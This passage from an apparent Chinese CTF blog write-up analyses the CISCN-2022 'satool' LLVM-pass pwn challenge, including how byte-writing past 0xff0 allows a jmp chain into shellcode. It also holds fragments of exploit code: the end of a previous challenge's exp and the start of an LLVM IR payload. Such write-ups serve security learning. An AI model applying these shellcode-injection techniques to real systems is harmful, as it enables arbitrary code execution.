winmt132(0);</span><br><span class="line">    winmt133(0);</span><br><span class="line">    winmt134(0);</span><br><span class="line">    winmt135(0);</span><br><span class="line">    winmt136(0);</span><br><span class="line">    winmt137(0);</span><br><span class="line">    winmt138(0);</span><br><span class="line">    winmt139(0);</span><br><span class="line">    winmt140(0);</span><br><span class="line">    winmt141(0);</span><br><span class="line">    winmt142(0);</span><br><span class="line">    winmt143(0);</span><br><span class="line">    winmt144(0);</span><br><span class="line">    winmt145(0);</span><br><span class="line">    winmt146(0);</span><br><span class="line">    winmt147(0);</span><br><span class="line">    winmt148(0);</span><br><span class="line">    winmt149(0);</span><br><span class="line">    winmt150(0);</span><br><span class="line">    winmt151(0);</span><br><span class="line">    winmt152(0);</span><br><span class="line">    winmt153(0);</span><br><span class="line">    winmt154(0);</span><br><span class="line">    winmt155(0);</span><br><span class="line">    winmt156(0);</span><br><span class="line">    winmt157(0);</span><br><span class="line">    winmt158(0);</span><br><span class="line">    winmt159(0);</span><br><span class="line">    winmt160(0);</span><br><span class="line">    winmt161(0);</span><br><span class="line">    winmt162(0);</span><br><span class="line">    winmt163(0);</span><br><span class="line">    winmt164(0);</span><br><span class="line">    winmt165(0);</span><br><span class="line">    winmt166(0);</span><br><span class="line">    winmt167(0);</span><br><span class="line">    winmt168(0);</span><br><span class="line">    winmt169(0);</span><br><span class="line">    winmt170(0);</span><br><span class="line">    winmt171(0);</span><br><span class="line">    winmt172(0);</span><br><span class="line">    winmt173(0);</span><br><span class="line">    winmt174(0);</span><br><span class="line">    winmt175(0);</span><br><span class="line">    winmt176(0);</span><br><span class="line">    winmt177(0);</span><br><span class="line">    winmt178(0);</span><br><span class="line">    winmt179(0);</span><br><span class="line">    winmt180(0);</span><br><span class="line">    winmt181(0);</span><br><span class="line">    winmt182(0);</span><br><span class="line">    winmt183(0);</span><br><span class="line">    winmt184(0);</span><br><span class="line">    winmt185(0);</span><br><span class="line">    winmt186(0);</span><br><span class="line">    winmt187(0);</span><br><span class="line">    winmt188(0);</span><br><span class="line">    winmt189(0);</span><br><span class="line">    winmt190(0);</span><br><span class="line">    winmt191(0);</span><br><span class="line">    winmt192(0);</span><br><span class="line">    winmt193(0);</span><br><span class="line">    winmt194(0);</span><br><span class="line">    winmt195(0);</span><br><span class="line">    winmt196(0);</span><br><span class="line">    winmt197(0);</span><br><span class="line">    winmt198(0);</span><br><span class="line">    winmt199(0);</span><br><span class="line">    winmt200(0);</span><br><span class="line">    winmt201(0);</span><br><span class="line">    winmt202(0);</span><br><span class="line">    winmt203(0);</span><br><span class="line">    winmt204(0);</span><br><span class="line">    winmt205(0);</span><br><span class="line">    winmt206(0);</span><br><span class="line">    winmt207(0);</span><br><span class="line">    winmt208(0);</span><br><span class="line">    winmt209(0);</span><br><span class="line">    winmt210(0);</span><br><span class="line">    winmt211(0);</span><br><span class="line">    winmt212(0);</span><br><span class="line">    winmt213(0);</span><br><span class="line">    winmt214(0);</span><br><span class="line">    winmt215(0);</span><br><span class="line">    winmt216(0);</span><br><span class="line">    winmt217(0);</span><br><span class="line">    winmt218(0);</span><br><span class="line">    winmt219(0);</span><br><span class="line">    winmt220(0);</span><br><span class="line">    winmt221(0);</span><br><span class="line">    winmt222(0);</span><br><span class="line">    winmt223(0);</span><br><span class="line">    winmt224(0);</span><br><span class="line">    winmt225(0);</span><br><span class="line">    winmt226(0);</span><br><span class="line">    winmt227(0);</span><br><span class="line">    winmt228(0);</span><br><span class="line">    winmt229(0);</span><br><span class="line">    winmt230(0);</span><br><span class="line">    winmt231(0);</span><br><span class="line">    winmt232(0x6B);</span><br><span class="line">    winmt233(0x69);</span><br><span class="line">    winmt234(0x44);</span><br><span class="line">    winmt235(0x00);</span><br><span class="line">    winmt236(0);</span><br><span class="line">    winmt237(0);</span><br><span class="line">    winmt238(0);</span><br><span class="line">    winmt239(0);</span><br><span class="line">    winmt240(0x90);</span><br><span class="line"> </span><br><span class="line">    winmt240(0x90);</span><br><span class="line">    winmt232(0x6B);</span><br><span class="line">    winmt233(0x69);</span><br><span class="line">    winmt234(0x44);</span><br><span class="line">    winmt235(0x00);</span><br><span class="line"> </span><br><span class="line">    fight(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="CISCN-2022-satool"   >
          <a href="#CISCN-2022-satool" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2022-satool" class="headerlink" title="CISCN-2022 satool"></a>CISCN-2022 satool</h2>
      
        <h3 id="漏洞分析-3"   >
          <a href="#漏洞分析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>常见的找到处理函数<code>runOnFunction</code>和注册名<code>mba</code>，函数名称没有限定，任意函数都可以。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831092827452.png" alt="image-20230831092827452"></p>
<p>首先是给<code>this[4]</code>可写可执行权限，然后进入<code>handle</code>对其进行操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094134640.png" alt="image-20230831094134640"></p>

        <h4 id="handle函数"   >
          <a href="#handle函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#handle函数" class="headerlink" title="handle函数"></a>handle函数</h4>
      <p>在<code>handle</code>里面针对基本块的操作数的属性(常量/函数参数/本地变量)，来调用对应的函数对<code>this</code>进行修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094203070.png" alt="image-20230831094203070"></p>
<ul>
<li><p><code>arg0</code>为常量：</p>
<p><code>this[12]</code>赋值为0</p>
<ul>
<li><p><code>writeMovImm64(this, 0, SExtValue)</code>：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094355406.png" alt="image-20230831094355406"></p>
<p>写入<code>this[5]</code>指针对应内容为<code>\x48\xB8 + a3</code>，这个<code>a3</code>即为基本块的操作数 ，随后<code>this[5]</code>对应指针+10，相当于一次修改10个字节，对应汇编语句为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140633173.png" alt="image-20230831140633173"></p>
</li>
<li><p><code>write(this)</code>：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831094815416.png" alt="image-20230831094815416"></p>
<p>写入<code>this[5]</code>指针对应内容为<code>\xc3</code>，对应汇编为<code>ret</code></p>
<p>总的来说就是写入<code>(\x48\xB8 + a3)</code>再写入<code>\xc3</code></p>
</li>
</ul>
</li>
<li><p><code>arg0</code>为函数参数：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140800260.png" alt="image-20230831140800260"></p>
<p><code>this[12]</code>赋值为1，通过上述分析可知，写入<code>this[5]</code>的数据为<code>(\x48\xB8\x00).ljust(10,&#39;\x00&#39;) + \xc3</code>，对应汇编为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831140826181.png" alt="image-20230831140826181"></p>
</li>
<li><p><code>arg0</code>为本地变量：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141053247.png" alt="image-20230831141053247"></p>
<p>首先是写入<code>movavs rax,0</code>，然后<code>this[12]</code>赋值为0，<code>stackLLvmValueVar</code>压入操作符，<code>stackIntVar</code>压入1，进入循环，直到写入<code>0xff0</code>字节后跳出循环</p>
<ul>
<li><p><code>while</code>循环</p>
<p>经过一些判断，代表只对操作符为<code>\xd</code>和<code>\xf</code>的进行操作，查<code>LLVM</code>定义的表为<code>add</code>和<code>sub</code>指令有效。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141354185.png" alt="image-20230831141354185"></p>
<ul>
<li><p><code>arg0</code>为常量，且为1或-1时，调用<code>writeInc</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831141929747.png" alt="image-20230831141929747"><code>stackIntVar_top*arg0</code>为1时，写入<code>inc rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142327635.png" alt="image-20230831142327635"><code>stackIntVar_top*arg0</code>不为1时，写入<code>dec rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142406119.png" alt="image-20230831142406119"></p>
<p><code>arg0</code>为常量不为1或-1时，调用<code>writeMovImm64</code>函数，写入<code>\x48\xbb + arg0*stackIntVar_top </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142605020.png" alt="image-20230831142605020"></p>
<p>调用<code>writeOpReg</code>函数，写入<code>\x48\x01\xd8</code>，即为<code>add rax,rbx</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143318448.png" alt="image-20230831143318448"></p>
</li>
<li><p><code>arg0</code>为函数参数时，<code>this[12]</code>赋值为<code>stackIntVar_top</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143424721.png" alt="image-20230831143424721"></p>
</li>
<li><p><code>arg0</code>为变量时，将<code>arg0</code>放<code>入stackLLvmValueVar</code>，<code>stackIntVar_top</code>放入<code>stackIntVar</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143518100.png" alt="image-20230831143518100"></p>
</li>
<li><p>指令为<code>sub</code>时，<code>stackIntVar_top = -stackIntVar_top</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143830853.png" alt="image-20230831143830853"></p>
</li>
<li><p><code>arg1</code>为常量时，且为1或-1时，调用<code>writeInc</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144224528.png" alt="image-20230831144224528"></p>
<p><code>stackIntVar_top</code>为1时，写入<code>inc rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142327635.png" alt="image-20230831142327635"><code>stackIntVar_top</code>不为1时，写入<code>dec rax</code><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142406119.png" alt="image-20230831142406119"></p>
<p><code>arg0</code>为常量不为1或-1时，调用<code>writeMovImm64</code>函数，写入<code>\x48\xbb + arg0*stackIntVar_top </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831142605020.png" alt="image-20230831142605020"></p>
<p>调用<code>writeOpReg</code>函数，写入<code>\x48\x01\xd8</code>，即为<code>add rax,rbx</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831143318448.png" alt="image-20230831143318448"></p>
</li>
<li><p><code>arg1</code>为函数参数时，<code>this[12]</code>赋值为<code>stackIntVar_top</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144329204.png" alt="image-20230831144329204"></p>
</li>
<li><p><code>arg1</code>为本地变量时 ，将<code>arg1</code>放<code>入stackLLvmValueVar</code>，<code>stackIntVar_top</code>放入<code>stackIntVar</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831144410252.png" alt="image-20230831144410252"></p>
</li>
</ul>
</li>
<li><p>跳出<code>while</code>循环后对栈进行析构操作</p>
</li>
</ul>
</li>
</ul>

        <h4 id="执行指令"   >
          <a href="#执行指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#执行指令" class="headerlink" title="执行指令"></a>执行指令</h4>
      <p>退出<code>handle</code>函数后，会赋予<code>this[4]</code>可读可执行的权限，并且进入<code>callCode</code>进行执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831145139588.png" alt="image-20230831145139588"></p>
<p>这里注意一下<code>this[4]</code>和<code>this[5]</code>最开始存放的是同一个指针，所以我们写入的地方就是<code>this[4]</code>存放的指针位置处。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831145218292.png" alt="image-20230831145218292"></p>
<p>漏洞点发生在整体的逻辑上，调试可知，最开始的<code>this[4]</code>是本身完全被初始化为<code>ret</code>指令，并且长度超过<code>0xff0</code>，那么当通过<code>while</code>循环写入超过<code>0xff0</code>长度的指令时</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230831150630034.png" alt="image-20230831150630034"></p>
<p>那么无论最后有没有被写入<code>ret</code>再退出循环，都会存在<code>ret</code>指令，从而安全退出，执行到下一个函数进行解析。这样就可以在第一个函数中超出<code>0xff0</code>长度写入<code>jmp</code>指令，使用形如<code>add var,con</code>形式如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xff0 mov raxabs,xx</span><br><span class="line">0xff8 add rax,rbx</span><br><span class="line">0xffb mov raxabx,yyyy</span><br><span class="line">0x1000 ret</span><br></pre></td></tr></table></div></figure>

<p>其中<code>yyyy</code>数据的<code>0xffe</code>地址开始处就包含<code>jmp</code>指令</p>
<p>第二个函数中写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xff0 mov raxabs,xx</span><br><span class="line">0xff8 add rax,rbx</span><br><span class="line">0xffb dec rax</span><br></pre></td></tr></table></div></figure>

<p>这样总的就是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xff0 mov raxabs,xx</span><br><span class="line">0xff8 add rax,rbx</span><br><span class="line">0xffb dec rax</span><br><span class="line">0xffe jmp xxx</span><br><span class="line">0x1000 ret</span><br></pre></td></tr></table></div></figure>

<p>顺利绕过末尾补<code>ret</code>进入<code>jmp</code>跳转。</p>
<p>随后通过之前的<code>mov raxabs,xxxx</code>中的<code>xxxx</code>八个字节，完成赋值加连环跳转的工作，从而执行真正的<code>shellcode</code></p>

        <h3 id="漏洞利用-3"   >
          <a href="#漏洞利用-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p>就直接用<code>winmt</code>师傅的<code>exp</code>了</p>
<p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9" >原创] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>需要注意的是，由于使用的只能是<code>add/sub</code>指令，所以需要通过空函数的<code>exp.c</code>生成<code>exp.ll</code>，然后再在里面补充对应的<code>add</code>指令即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;exp.c&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;exp.c&quot;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"> </span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @payload1(i64 %<span class="number">0</span>) #<span class="number">0</span> 